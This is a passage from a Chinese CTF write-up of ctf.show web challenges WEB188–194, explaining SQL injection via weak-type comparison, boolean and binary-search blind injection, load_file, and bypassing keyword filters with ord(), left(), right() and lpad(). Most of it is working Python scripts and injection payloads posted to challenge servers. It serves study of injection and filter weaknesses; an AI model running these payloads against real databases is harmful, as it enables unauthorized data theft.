<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">在where <span class="hljs-attribute">username</span>=0这样的查询中，因为username都会是字符串，在mysql中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，因此这个where可以把所有以字母开头的数据查出来。<br>而<span class="hljs-attribute">password</span>=0的原因在于这里：<br>intval让等号右边为数字0<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">'pass'</span>]==intval(<span class="hljs-variable">$password</span>)){<br>没错。。。弱类型比较，看来查出来的pass也都是以字母开头的，所以<span class="hljs-attribute">password</span>=0可以成功弱类型比较，得到flag。<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB189"><a href="#WEB189" class="headerlink" title="WEB189"></a>WEB189</h3><p>username=0/1，为0返回的是密码错误，是1返回的就是查询失败</p>
<p>PY:</p>
<figure class="highlight haskell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-meta"># 每秒发送不超过5个请求</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br> <br><span class="hljs-title">url</span> = <span class="hljs-string">"http://91ac287a-8719-4b8f-8ecc-11e2ab145ee9.challenge.ctf.show/api/"</span><br><span class="hljs-title">flagstr</span> = <span class="hljs-string">"}{&lt;&gt;$=,;_ 'abcdefghijklmnopqr-stuvwxyz0123456789"</span><br> <br><span class="hljs-title">flag</span> = <span class="hljs-string">""</span><br><span class="hljs-title">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">257</span>,<span class="hljs-number">257</span>+<span class="hljs-number">60</span>):<br>	for x <span class="hljs-keyword">in</span> flagstr:<br>		<span class="hljs-class"><span class="hljs-keyword">data</span>={</span><br><span class="hljs-class">		"<span class="hljs-title">username</span>":"<span class="hljs-title">if</span>(<span class="hljs-title">substr</span>(<span class="hljs-title">load_file</span>('/<span class="hljs-title">var</span>/<span class="hljs-title">www</span>/<span class="hljs-title">html</span>/<span class="hljs-title">api</span>/<span class="hljs-title">index</span>.<span class="hljs-title">php'</span>),{},1)=('{}'),1,0)".format(<span class="hljs-title">i</span>,<span class="hljs-title">x</span>),</span><br>		<span class="hljs-string">"password"</span>:<span class="hljs-string">"0"</span><br>		}<br>		print(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br>		response = requests.post(url,<span class="hljs-class"><span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)</span><br>		time.sleep(<span class="hljs-number">0.3</span>)<br>		<span class="hljs-keyword">if</span> response.text.find(<span class="hljs-string">"8d25"</span>)&gt;<span class="hljs-number">0</span>:<br>			#print(<span class="hljs-string">"{} is right"</span>.format(x))<br>			flag+=x<br>			break<br>		<span class="hljs-keyword">else</span>:<br>			#print(<span class="hljs-string">"{} is wrong"</span>.format(x))<br>			continue<br>	print(flag)<br> <br></code></pre></td></tr></tbody></table></figure>

<p>返回数据：</p>
<figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">{"<span class="hljs-selector-tag">code</span>":<span class="hljs-number">0</span>,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2\u5931\u8d25"</span>,<span class="hljs-string">"count"</span>:<span class="hljs-number">0</span>,<span class="hljs-string">"data"</span>:[]}<br>Unicode 编码表示的字符串：查询失败<br></code></pre></td></tr></tbody></table></figure>

<p>SQL语句：</p>
<figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">select pass from ctfshow_user where username = <span class="hljs-keyword">if</span>(substr(load<span class="hljs-constructor">_file('<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">api</span><span class="hljs-operator">/</span><span class="hljs-params">index</span>.<span class="hljs-params">php</span>')</span>,<span class="hljs-number">263</span>,<span class="hljs-number">1</span>)=(<span class="hljs-character">'='</span>),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB190"><a href="#WEB190" class="headerlink" title="WEB190"></a>WEB190</h3><p>二分法盲注：</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import requests<br><br>s=<span class="hljs-string">"q{wertyuiopasdfghjklzxcvbnm1234567890_-}"</span><br>url=<span class="hljs-string">"http://de04b297-1b06-4df9-8fa0-4593e56e697e.challenge.ctf.show//api/"</span><br>flag=<span class="hljs-string">''</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low=<span class="hljs-number">32</span><br>    high=<span class="hljs-number">128</span><br>    mid=(low+high)<span class="hljs-comment">//2</span><br>    while low&lt;high:<br>        payload=<span class="hljs-string">"'or ascii(substr((select group_concat(f1ag) from ctfshow_fl0g),{},1))&gt;{}#"</span><span class="hljs-selector-class">.format</span>(<span class="hljs-selector-tag">i</span>,mid)<br>        #payload=<span class="hljs-string">"' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&lt;{},1,0)-- -"</span><span class="hljs-selector-class">.format</span>(<span class="hljs-selector-tag">i</span>,j)<br>        #payload=<span class="hljs-string">"' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))&lt;{},1,0)-- -"</span><span class="hljs-selector-class">.format</span>(<span class="hljs-selector-tag">i</span>,j)<br>        <br>        data={<br>            <span class="hljs-string">"username"</span>:payload,<br>            <span class="hljs-string">"password"</span>:<span class="hljs-number">1</span><br>        }<br>        <br>        r=requests<span class="hljs-selector-class">.post</span>(url,data=data)<br>        <span class="hljs-built_in">print</span>(low,mid,high)<br>      <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">"\\u5bc6\\u7801\\u9519\\u8bef"</span> <span class="hljs-keyword">in</span> r<span class="hljs-selector-class">.text</span>:<br>            low=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high=mid<br>        mid=(low+high)<span class="hljs-comment">//2</span><br>    flag+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(flag)<br>    <span class="hljs-keyword">if</span> mid==<span class="hljs-number">32</span>:<br>        <span class="hljs-built_in">print</span>(flag)  <br>        break<br></code></pre></td></tr></tbody></table></figure>

<h2 id="WEB191"><a href="#WEB191" class="headerlink" title="WEB191"></a>WEB191</h2><p>这一题明确提示了<strong>布尔盲注</strong>，也就是说在某个条件下，页面返回的数据会有<strong>真假值</strong>的切换。</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">/查询语句<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select pass from ctfshow_user where username = '<span class="hljs-subst">{$username}</span>'"</span>;<br><br>/密码检测<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>)){<br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'密码只能为数字'</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>  }<br><br>  <span class="hljs-comment">//密码判断</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">'pass'</span>]==<span class="hljs-variable">$password</span>){<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'登陆成功'</span>;<br>    }<br><br>  <span class="hljs-comment">//<span class="hljs-doctag">TODO:</span>感觉少了个啥，奇怪</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/file|into|ascii/i'</span>, <span class="hljs-variable">$username</span>)){<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'用户名非法'</span>;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>    }<br></code></pre></td></tr></tbody></table></figure>

<p>SQL函数ord():</p>
<p>在 SQL 中，<code>ORD()</code> 函数用于返回给定字符的 ASCII 值。ASCII（American Standard Code for Information Interchange）是一种用于表示字符的编码标准，其中每个字符都对应一个唯一的数字值。</p>
<p><code>ORD()</code> 函数通常用于字符串操作，它接受一个参数，即要获取 ASCII 值的字符，然后返回该字符的 ASCII 值。</p>
<p>以下是 <code>ORD()</code> 函数的示例用法：</p>
<figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">SELECT</span> <span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">ORD</span></span>(<span class="hljs-string">'A'</span>);</span><br></code></pre></td></tr></tbody></table></figure>

<p>上述示例将返回字符 ‘A’ 的 ASCII 值，即 65。</p>
<p>PY:</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> pass <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username = <span class="hljs-string">''</span> <span class="hljs-keyword">or</span> ord(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">128</span>#<br></code></pre></td></tr></tbody></table></figure>

<p>我们来看查询语句：</p>
<p><code>$sql = "select pass from ctfshow_user where username = '{$username}'";</code></p>
<figure class="highlight arcade"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">在 PHP 中，如果在双引号字符串中使用花括号 {} 来包裹变量，PHP 将会将花括号中的内容视为变量的名称，并将其替换为变量的值。因此，在给定的代码中，变量 <span class="hljs-symbol">$user</span>name 的值会被替换到 SQL 语句中的 {<span class="hljs-symbol">$user</span>name} 的位置。<br><br>例如，如果 <span class="hljs-symbol">$user</span>name 的值为 <span class="hljs-string">"john123"</span>，那么最终的 SQL 语句会变为：<br><span class="hljs-symbol">$s</span>ql = <span class="hljs-string">"select pass from ctfshow_user where username = 'john123'"</span>;<br></code></pre></td></tr></tbody></table></figure>

<p>因此是存在SQL注入的，也没有过滤ord()函数，因此我们在where语句后拼接条件：</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> pass <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username = <span class="hljs-string">''</span> <span class="hljs-keyword">or</span> ord(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">128</span>#<br><span class="hljs-string">' or ord(substr((select database()),1,1))&lt;128#</span><br></code></pre></td></tr></tbody></table></figure>

<p>判断数据库名称的第一个字符是否小于128，可以说就是一个永真条件，<strong>因此会返回满足条件的全部密码</strong>，但是密码肯定匹配不上，会返回<strong>密码错误</strong>。</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> pass <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username = <span class="hljs-string">''</span> <span class="hljs-keyword">or</span> ord(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">0</span>#<br><span class="hljs-string">' or ord(substr((select database()),1,1))&lt;0#</span><br></code></pre></td></tr></tbody></table></figure>

<p>这样就是一个永假条件，在题目中，会返回数据，<strong>用户不存在</strong>。</p>
<p>这样就有了真假值切换，我们就可以用来盲注。</p>
<figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs lua">import requests<br>import <span class="hljs-built_in">time</span><br><br>url = <span class="hljs-string">"http://33cf3e91-9901-4946-9a8d-8b1a83402017.challenge.ctf.show/api/"</span><br>flag = <span class="hljs-string">""</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span><br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        mid = (<span class="hljs-built_in">max</span> + <span class="hljs-built_in">min</span>) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">min</span> == mid):<br>            flag += chr(mid)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select database()),{},1))&lt;{})#"</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        # ctfshow_web<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&lt;{})#"</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        # ctfshow_fl0g<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))&lt;{})#"</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        # id,f1ag<br>        # payload = <span class="hljs-string">"admin'and (ord(substr((select f1ag from ctfshow_fl0g),{},1))&lt;{})#"</span>.<span class="hljs-built_in">format</span>(i, mid)<br>        payload = <span class="hljs-string">"' or ord(substr((select database()),{},1))&lt;{}#"</span>.<span class="hljs-built_in">format</span>(i, mid)<br><br>        data = {<br>            <span class="hljs-string">"username"</span>: payload,<br>            <span class="hljs-string">"password"</span>: <span class="hljs-number">0</span><br>        }<br>        res = requests.post(url, data=data)<br>        <span class="hljs-built_in">print</span>(res.text)<br>        <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> res.text.<span class="hljs-built_in">find</span>(<span class="hljs-string">"8bef"</span>) &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">max</span> = mid<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = mid<br></code></pre></td></tr></tbody></table></figure>

<p>flag:</p>
<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>{<span class="hljs-number">4529</span>e0fe-<span class="hljs-number">9</span>e1a-<span class="hljs-number">443</span>b-b192-<span class="hljs-number">882</span>f5da1cb34}<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB192"><a href="#WEB192" class="headerlink" title="WEB192"></a>WEB192</h3><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>密码检测<br><span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$password</span>)){<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'密码只能为数字'</span>;<br>  die(json_encode(<span class="hljs-variable">$ret</span>));<br>}<br><br><span class="hljs-regexp">//</span>密码判断<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">'pass'</span>]==<span class="hljs-variable">$password</span>){<br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'登陆成功'</span>;<br>  }<br><br><span class="hljs-regexp">//</span>TODO:感觉少了个啥，奇怪<br>  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/file|into|ascii|ord|hex/i'</span>, <span class="hljs-variable">$username</span>)){<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'用户名非法'</span>;<br>      die(json_encode(<span class="hljs-variable">$ret</span>));<br>  }<br></code></pre></td></tr></tbody></table></figure>

<p>PY:</p>
<figure class="highlight sas"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs sas">import requests<br>import time<br><br>url = <span class="hljs-string">"http://d03cc6e6-314e-471d-96ad-97c271bdd238.challenge.ctf.show/api/"</span><br><br>flagstr = <span class="hljs-string">"}{abcdefghijklmnopqr-stuvwxyz0123456789"</span><br>flag = <span class="hljs-string">""</span><br>for i <span class="hljs-keyword">in</span> <span class="hljs-meta">range</span>(1, 60):<br>    for <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> flagstr:<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select database()),{},1))&lt;{})#"</span>.<span class="hljs-keyword">format</span>(i,mid)<br>        # ctfshow_web<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&lt;{})#"</span>.<span class="hljs-keyword">format</span>(i,mid)<br>        # ctfshow_fl0g<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))&lt;{})#"</span>.<span class="hljs-keyword">format</span>(i,mid)<br>        # id,f1ag<br>        payload = <span class="hljs-string">"'or ((substr((select f1ag from ctfshow_fl0g),{},1)='{}'))#"</span>.<span class="hljs-keyword">format</span>(i, <span class="hljs-keyword">key</span>)<br><span class="hljs-keyword"></span><br><span class="hljs-keyword">        data </span>= {<br>            <span class="hljs-string">"username"</span>: payload,<br>            <span class="hljs-string">"password"</span>: 0,<br>        }<br>        res = requests.post(url=url, data=data)<br>        time.sleep(0.3)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">"8bef"</span>) &gt; 0:<br>            flag += <span class="hljs-keyword">key</span><br>            pr<span class="hljs-meta">int</span>(flag)<br>            break<br><br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB193"><a href="#WEB193" class="headerlink" title="WEB193"></a>WEB193</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//<span class="hljs-doctag">TODO:</span>感觉少了个啥，奇怪</span><br>    <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span><span class="hljs-params">file</span>|<span class="hljs-params">into</span>|<span class="hljs-params">ascii</span>|<span class="hljs-params">ord</span>|<span class="hljs-params">hex</span>|<span class="hljs-params">substr</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>', $<span class="hljs-params">username</span>)</span>){<br>        $ret<span class="hljs-literal">['<span class="hljs-identifier">msg</span>']</span>='用户名非法';<br>        die(json<span class="hljs-constructor">_encode($<span class="hljs-params">ret</span>)</span>);<br>    }<br></code></pre></td></tr></tbody></table></figure>

<p>增加了过滤substr()函数，使用left(),right()函数即可。</p>
<h4 id="LEFT"><a href="#LEFT" class="headerlink" title="LEFT:"></a>LEFT:</h4><p>在 SQL 中，<code>LEFT()</code> 函数是用于从字符串的左侧提取指定长度的字符或子字符串的函数。它接受两个参数：一个是要提取的字符串，另一个是要提取的字符或子字符串的长度。</p>
<p><code>LEFT()</code> 函数的语法如下：</p>
<figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">LEFT(<span class="hljs-params">string</span>, <span class="hljs-params">length</span>)</span><br></code></pre></td></tr></tbody></table></figure>

<p>其中：</p>
<ul>
<li><code>string</code> 是要提取字符或子字符串的源字符串。</li>
<li><code>length</code> 是一个整数，表示要提取的字符或子字符串的长度。</li>
</ul>
<p><code>LEFT()</code> 函数会从 <code>string</code> 的左侧开始提取长度为 <code>length</code> 的字符或子字符串，并将其作为结果返回。</p>
<p>以下是一个使用 <code>LEFT()</code> 函数的示例：</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">LEFT</span>(<span class="hljs-string">'Hello, World!'</span>, <span class="hljs-number">5</span>);<br></code></pre></td></tr></tbody></table></figure>

<p>上述示例将返回字符串 <code>'Hello'</code>，因为它从左侧开始提取了长度为 5 的字符或子字符串。</p>
<h4 id="RIGHT"><a href="#RIGHT" class="headerlink" title="RIGHT:"></a>RIGHT:</h4><p>在 SQL 中，<code>RIGHT()</code> 函数用于从字符串的右侧提取指定长度的字符或子字符串。它接受两个参数：一个是要提取的字符串，另一个是要提取的字符或子字符串的长度。</p>
<p><code>RIGHT()</code> 函数的语法如下：</p>
<figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-literal">RIGHT</span>(<span class="hljs-keyword">string</span>, <span class="hljs-built_in">length</span>)<br></code></pre></td></tr></tbody></table></figure>

<p>其中：</p>
<ul>
<li><code>string</code> 是要提取字符或子字符串的源字符串。</li>
<li><code>length</code> 是一个整数，表示要提取的字符或子字符串的长度。</li>
</ul>
<p><code>RIGHT()</code> 函数会从 <code>string</code> 的右侧开始提取长度为 <code>length</code> 的字符或子字符串，并将其作为结果返回。</p>
<p>以下是一个使用 <code>RIGHT()</code> 函数的示例：</p>
<figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">RIGHT</span>(<span class="hljs-string">'Hello, World!'</span>, <span class="hljs-number">6</span>);<br></code></pre></td></tr></tbody></table></figure>

<p>上述示例将返回字符串 <code>'World!'</code>，因为它从右侧开始提取了长度为 6 的字符或子字符串。</p>
<figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">payload</span> = <span class="hljs-string">"'or ((left((select f1ag from ctfshow_flxg),{})='{}'))#"</span>.format(i,flag + key)<br></code></pre></td></tr></tbody></table></figure>

<h3 id="WEB194"><a href="#WEB194" class="headerlink" title="WEB194"></a>WEB194</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//<span class="hljs-doctag">TODO:</span>感觉少了个啥，奇怪</span><br>   <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span><span class="hljs-params">file</span>|<span class="hljs-params">into</span>|<span class="hljs-params">ascii</span>|<span class="hljs-params">ord</span>|<span class="hljs-params">hex</span>|<span class="hljs-params">substr</span>|<span class="hljs-params">char</span>|<span class="hljs-params">left</span>|<span class="hljs-params">right</span>|<span class="hljs-params">substring</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>', $<span class="hljs-params">username</span>)</span>){<br>       $ret<span class="hljs-literal">['<span class="hljs-identifier">msg</span>']</span>='用户名非法';<br>       die(json<span class="hljs-constructor">_encode($<span class="hljs-params">ret</span>)</span>);<br></code></pre></td></tr></tbody></table></figure>

<h4 id="LPAD"><a href="#LPAD" class="headerlink" title="LPAD()"></a>LPAD()</h4><p>类似的，还有rpad()函数。</p>
<p>在 SQL 中，<code>LPAD()</code> 函数用于在字符串的左侧填充指定字符，使其达到指定的长度。它接受三个参数：一个是要填充的字符串，另一个是目标长度，最后一个是要填充的字符。</p>
<p><code>LPAD()</code> 函数的语法如下：</p>
<figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">LPAD(<span class="hljs-params">string</span>, <span class="hljs-params">length</span>, <span class="hljs-params">fill_character</span>)</span><br></code></pre></td></tr></tbody></table></figure>

<p>其中：</p>
<ul>
<li><code>string</code> 是要填充的字符串。</li>
<li><code>length</code> 是最终目标长度，如果字符串长度小于目标长度，则进行填充。</li>
<li><code>fill_character</code> 是要填充的字符。</li>
</ul>
<p><code>LPAD()</code> 函数会在 <code>string</code> 字符串的左侧不断添加 <code>fill_character</code> 字符，直到达到指定的 <code>length</code> 长度。如果字符串已经达到或超过目标长度，将不会进行填充，而是直接返回原始字符串。</p>
<p>以下是一个使用 <code>LPAD()</code> 函数的示例：</p>
<figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> LPAD(<span class="hljs-string">'Hello'</span>, <span class="hljs-number">10</span>, <span class="hljs-string">'*'</span>);<br></code></pre></td></tr></tbody></table></figure>

<p>上述示例将返回字符串 <code>'*****Hello'</code>，因为它在字符串 <code>'Hello'</code> 的左侧添加了 5 个 <code>*</code> 字符，使其总长度达到目标长度 10。</p>
<p>PY:</p>
